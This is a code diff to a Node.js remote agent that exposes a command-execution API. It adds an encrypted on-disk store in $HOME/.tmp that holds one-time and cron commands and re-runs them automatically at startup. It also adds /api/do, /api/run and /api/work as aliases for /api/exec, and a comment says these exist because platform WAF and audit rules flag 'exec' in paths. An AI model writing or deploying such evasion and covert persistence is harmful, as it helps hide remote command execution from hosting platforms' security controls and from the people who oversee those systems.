@@ -346,7 +346,7 @@ class Config {
   static KNAME_KEY = (process.env.KNAME_KEY || '').trim();
   // 域名文件路径, 缺省 $HOME/domain.txt, 支持 $HOME / ~ 前缀
   static KPATH = process.env.KPATH || '';
-  static AGENT_VERSION = process.env.AGENT_VERSION || '0.5.6-js';
+  static AGENT_VERSION = process.env.AGENT_VERSION || '0.5.7-js';
   static SESSION_KEY = crypto.randomBytes(32).toString('base64');
   // static SESSION_KEY =""
   static NOISE_KEYS_INTERNAL = NoiseKeyGenerator.generatePair();
@@ -2246,6 +2246,177 @@ class FileManager {
 }
 
 // ============================================================================
+// 💾 任务持久化 (0.5.7, docs/API.MD 十三)
+// - KSTORE_KEY 环境变量为唯一密钥来源 (base64/hex 32 字节), 不落盘; 未设置/非法则
+//   持久化关闭 (fail-closed, 绝不明文落盘)
+// - KSTORE 指定存储路径, off/0 显式关闭; 缺省 $HOME/.tmp/store.enc
+// - 文件内容复用 0.5.6 响应加密容器 Base64(JSON{nonce,tag,ciphertext}),
+//   明文为 {"magic","version","saved_at","data":{onetasks,crontasks}}
+// - 仅持久化任务定义 (不含执行日志); 原子写 (tmp+rename); I/O 故障仅记日志降级,
+//   绝不影响内存任务、请求成功与 agent 启动
+// ============================================================================
+class TaskStore {
+  static MAGIC = 'kisama-store';
+  static VERSION = 1;
+
+  static state = {
+    enabled: false,
+    locked: false,      // true=加载到高版本数据, 禁止覆盖写
+    path: null,
+    key: null,
+    lastSavedAt: null
+  };
+
+  static homeDir() {
+    for (const d of [process.env.USERPROFILE, process.env.HOME]) {
+      if (d && fs.existsSync(d)) return d;
+    }
+    try { return os.homedir() || process.cwd(); } catch (e) { return process.cwd(); }
+  }
+
+  static parseKey(raw) {
+    if (!raw) return null;
+    try {
+      if (/^[0-9a-fA-F]{64}$/.test(raw)) {
+        const key = Buffer.from(raw, 'hex');
+        return key.length === 32 ? key : null;
+      }
+      // 与 py 侧 b64decode(validate=True) 对齐: 先校验字符集再解码, 解码后必须恰为 32 字节
+      if (!/^[A-Za-z0-9+/]+={0,2}$/.test(raw)) return null;
+      const key = Buffer.from(raw, 'base64');
+      return key.length === 32 ? key : null;
+    } catch (e) {
+      return null;
+    }
+  }
+
+  static init() {
+    const state = TaskStore.state;
+    let rawPath = (process.env.KSTORE || '').trim();
+    if (['off', '0', 'none', 'false'].includes(rawPath.toLowerCase())) {
+      Logger.info('[TaskStore] 💾 KSTORE=off, 任务持久化已显式关闭');
+      return state;
+    }
+    const rawKey = (process.env.KSTORE_KEY || '').trim();
+    if (!rawPath) {
+      rawPath = path.join(TaskStore.homeDir(), '.tmp', 'store.enc');
+    }
+    const key = TaskStore.parseKey(rawKey);
+    if (!key) {
+      if (rawKey) Logger.error('[TaskStore] ❌ KSTORE_KEY 非法 (需 base64/hex 编码的 32 字节), 任务持久化保持关闭');
+      else Logger.info('[TaskStore] 💾 KSTORE_KEY 未设置, 任务持久化未启用');
+      return state;
+    }
+    state.path = rawPath;
+    state.key = key;
+    state.enabled = true;
+    Logger.info(`[TaskStore] 💾 任务持久化已启用: ${state.path}`);
+    return state;
+  }
+
+  // AES-256-GCM 容器与 0.5.6 响应加密一致: Base64(JSON{nonce,tag,ciphertext}), nonce 12 字节
+  static encrypt(key, plaintextStr) {
+    const iv = crypto.randomBytes(12);
+    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
+    const ciphertext = Buffer.concat([cipher.update(Buffer.from(plaintextStr, 'utf8')), cipher.final()]);
+    const payload = {
+      nonce: iv.toString('base64'),
+      tag: cipher.getAuthTag().toString('base64'),
+      ciphertext: ciphertext.toString('base64')
+    };
+    return Buffer.from(JSON.stringify(payload), 'utf8').toString('base64');
+  }
+
+  static decrypt(key, payloadB64) {
+    const payload = JSON.parse(Buffer.from(payloadB64, 'base64').toString('utf8'));
+    if (!payload.nonce || !payload.tag || !payload.ciphertext) {
+      throw new Error('密文容器缺少 nonce/tag/ciphertext 字段');
+    }
+    const decipher = crypto.createDecipheriv('aes-256-gcm', key, Buffer.from(payload.nonce, 'base64'));
+    decipher.setAuthTag(Buffer.from(payload.tag, 'base64'));
+    return Buffer.concat([
+      decipher.update(Buffer.from(payload.ciphertext, 'base64')),
+      decipher.final()
+    ]).toString('utf8');
+  }
+
+  static load() {
+    const state = TaskStore.state;
+    if (!state.enabled) return { onetasks: [], crontasks: {} };
+    try {
+      if (!fs.existsSync(state.path)) return { onetasks: [], crontasks: {} };
+      const payloadB64 = fs.readFileSync(state.path, 'utf8').trim();
+      if (!payloadB64) return { onetasks: [], crontasks: {} };
+      let doc;
+      try {
+        doc = JSON.parse(TaskStore.decrypt(state.key, payloadB64));
+      } catch (e) {
+        throw new Error(`解密失败 (密钥错误或数据被篡改): ${e.message}`);
+      }
+      if (!doc || doc.magic !== TaskStore.MAGIC) throw new Error('magic 不匹配');
+      const version = parseInt(doc.version, 10) || 0;
+      if (version > TaskStore.VERSION) {
+        // 高版本数据: 保留原文件并锁定写, 防止旧版本 agent 覆盖
+        state.locked = true;
+        Logger.error(`[TaskStore] ❌ 存储版本 ${version} 高于支持版本 ${TaskStore.VERSION}, 保留原文件不覆盖, 本次以空任务启动且持久化只读`);
+        return { onetasks: [], crontasks: {} };
+      }
+      if (version !== TaskStore.VERSION) throw new Error(`不支持的版本 ${version}`);
+      const data = doc.data || {};
+      state.lastSavedAt = doc.saved_at || null;
+      const onetasks = Array.isArray(data.onetasks) ? data.onetasks.map(String) : [];
+      const crontasks = {};
+      for (const [k, v] of Object.entries(data.crontasks || {})) crontasks[String(k)] = String(v);
+      Logger.info(`[TaskStore] 💾 已恢复持久化任务: onetime=${onetasks.length}, cron=${Object.keys(crontasks).length}`);
+      return { onetasks, crontasks };
+    } catch (e) {
+      TaskStore.quarantine(`加载失败: ${e.message}`);
+      return { onetasks: [], crontasks: {} };
+    }
+  }
+
+  static quarantine(reason) {
+    try {
+      const state = TaskStore.state;
+      if (state.path && fs.existsSync(state.path)) {
+        const bad = `${state.path}.bad-${Date.now()}`;
+        fs.renameSync(state.path, bad);
+        Logger.error(`[TaskStore] ❌ ${reason}, 原文件已隔离: ${bad}`);
+      } else {
+        Logger.error(`[TaskStore] ❌ ${reason}`);
+      }
+    } catch (e) {
+      Logger.error(`[TaskStore] ❌ ${reason}, 且隔离失败: ${e.message}`);
+    }
+  }
+
+  static save(onetasks, crontasks) {
+    const state = TaskStore.state;
+    if (!state.enabled || state.locked) return false;
+    let tmp = null;
+    try {
+      const doc = {
+        magic: TaskStore.MAGIC,
+        version: TaskStore.VERSION,
+        saved_at: new Date().toISOString().replace(/\.\d+Z$/, 'Z'),
+        data: { onetasks: onetasks || [], crontasks: crontasks || {} }
+      };
+      const payload = TaskStore.encrypt(state.key, JSON.stringify(doc));
+      fs.mkdirSync(path.dirname(state.path), { recursive: true });
+      tmp = `${state.path}.tmp-${process.pid}`;
+      fs.writeFileSync(tmp, payload, 'utf8');
+      fs.renameSync(tmp, state.path);
+      state.lastSavedAt = doc.saved_at;
+      return true;
+    } catch (e) {
+      Logger.error(`[TaskStore] ❌ 保存失败 (内存任务不受影响): ${e.message}`);
+      try { if (tmp && fs.existsSync(tmp)) fs.unlinkSync(tmp); } catch (e2) { /* 忽略 */ }
+      return false;
+    }
+  }
+}
+
+// ============================================================================
 // ⚙️ 任务管理器
 // ============================================================================
 class TaskManager {
@@ -2281,30 +2452,34 @@ class TaskManager {
 
   static async setOnetimeTasks(tasks) {
     Config.onetasks = tasks || [];
-    Config.InitTask = true;
 
     const executed = [];
-    for (let i = 0; i < Config.onetasks.length; i++) {
-      const cmd = Config.onetasks[i];
-      const result = await CommandExecutor.execute(cmd);
-      const entry = this._formatLogEntry(cmd, result.result, result.exitcode, 'onetime');
-      this._appendLog(Config.onetimetasks_log, entry);
-      executed.push({
-        index: i,
-        cmd,
-        exitcode: result.exitcode,
-        output: result.result,
-        status: result.exitcode === 0 ? 'ok' : 'error'
-      });
-    }
+    // 💾 单次执行语义 (0.5.7, docs/API.MD 十三): InitTask 已消费 (boot 恢复执行过
+    // 或本生命周期已执行过) 则只更新列表+落盘, 不再自动触发; 空列表不消费标记
+    if (Config.InitTask && Config.onetasks.length > 0) {
+      for (let i = 0; i < Config.onetasks.length; i++) {
+        const cmd = Config.onetasks[i];
+        const result = await CommandExecutor.execute(cmd);
+        const entry = this._formatLogEntry(cmd, result.result, result.exitcode, 'onetime');
+        this._appendLog(Config.onetimetasks_log, entry);
+        executed.push({
+          index: i,
+          cmd,
+          exitcode: result.exitcode,
+          output: result.result,
+          status: result.exitcode === 0 ? 'ok' : 'error'
+        });
+      }
 
-    Config.InitTask = false;
+      Config.InitTask = false;
+    }
 
     return {
       status: 'ok',
       count: Config.onetasks.length,
       tasks: Config.onetasks,
-      executed
+      executed,
+      persisted: TaskStore.save(Config.onetasks, Config.crontasks)
     };
   }
 
@@ -2358,7 +2533,8 @@ class TaskManager {
     return {
       status: 'ok',
       count: Object.keys(Config.crontasks).length,
-      tasks: Config.crontasks
+      tasks: Config.crontasks,
+      persisted: TaskStore.save(Config.onetasks, Config.crontasks)
     };
   }
 
@@ -2372,6 +2548,11 @@ class TaskManager {
         active: Config.cronloop,
         count: Object.keys(Config.crontasks).length,
         check_interval: Config.CRON_CHECK_INTERVAL
+      },
+      persistence: {
+        enabled: TaskStore.state.enabled,
+        store_path: TaskStore.state.path,
+        last_saved_at: TaskStore.state.lastSavedAt
       }
     };
   }
@@ -2451,6 +2632,29 @@ class TaskManager {
       executed: executed.length,
       results: executed
     };
+  }
+
+  // 💾 持久化恢复 (0.5.7, docs/API.MD 十三): main 中 listen 之前调用, 离线自治。
+  // - 恢复定时任务: 复用 setCronTasks 重建 node-cron 调度 (内容原样回写存储, 无副作用)
+  // - 恢复启动任务: 后台执行一次 (不阻塞 HTTP 就绪), 完成后置 InitTask=false,
+  //   远端再 POST /api/task/onetime 不会二次触发 (单次执行语义)
+  static restoreFromStore() {
+    TaskStore.init();
+    const restored = TaskStore.load();
+    if (restored.onetasks.length > 0) {
+      Config.onetasks = restored.onetasks;
+    }
+    if (Object.keys(restored.crontasks).length > 0) {
+      try {
+        TaskManager.setCronTasks(restored.crontasks);
+      } catch (e) {
+        Logger.error(`[TaskStore] ❌ 定时任务恢复异常 (不影响服务): ${e.message}`);
+      }
+    }
+    if (Config.onetasks.length > 0 && Config.InitTask) {
+      TaskManager.executeOnetimeTasks().catch(e =>
+        Logger.error(`[TaskStore] ❌ 启动任务恢复执行异常 (不影响服务): ${e.message}`));
+    }
   }
 }
 
@@ -5149,7 +5353,9 @@ async function main(options = {}) {
   });
 
   // 命令执行
-  app.post('/api/exec', async (req, res) => {
+  // exec 别名路由（0.5.7）：部分平台 WAF/审计规则对路径中的 exec 敏感，
+  // 受限环境优先 /api/do，备选 /api/run、/api/work；与 /api/exec 完全等价（签名用实际请求路径）。
+  const execHandler = async (req, res) => {
     try {
       let cmd = null;
 
@@ -5173,7 +5379,11 @@ async function main(options = {}) {
     } catch (e) {
       res.status(500).json({ status: 'error', message: e.message });
     }
-  });
+  };
+  app.post('/api/exec', execHandler);
+  for (const execAlias of ['/api/do', '/api/run', '/api/work']) {
+    app.post(execAlias, execHandler);
+  }
 
   // 文件列表
   app.post('/api/file/list', async (req, res) => {
@@ -5577,6 +5787,9 @@ async function main(options = {}) {
   });
   Logger.debug('WebSocket route configured');
 
+  // 💾 任务持久化恢复 (0.5.7, docs/API.MD 十三): listen 之前恢复, 离线自治
+  TaskManager.restoreFromStore();
+
   // 启动服务器
   Logger.debug('Starting HTTP server...');
   const server = app.listen(Config.PORT, Config.HOST, () => {
@@ -5608,4 +5821,4 @@ if (require.main === module||require.main?.filename?.includes('ts-node')) {
   main().catch(Logger.error);
 }
 
-module.exports = { main,Config, CryptoManager, SystemInfoCollector, CommandExecutor, FileManager, TaskManager, ArgoTunnelManager, KModeController, ZipArchiver };
+module.exports = { main,Config, CryptoManager, SystemInfoCollector, CommandExecutor, FileManager, TaskManager, TaskStore, ArgoTunnelManager, KModeController, ZipArchiver };
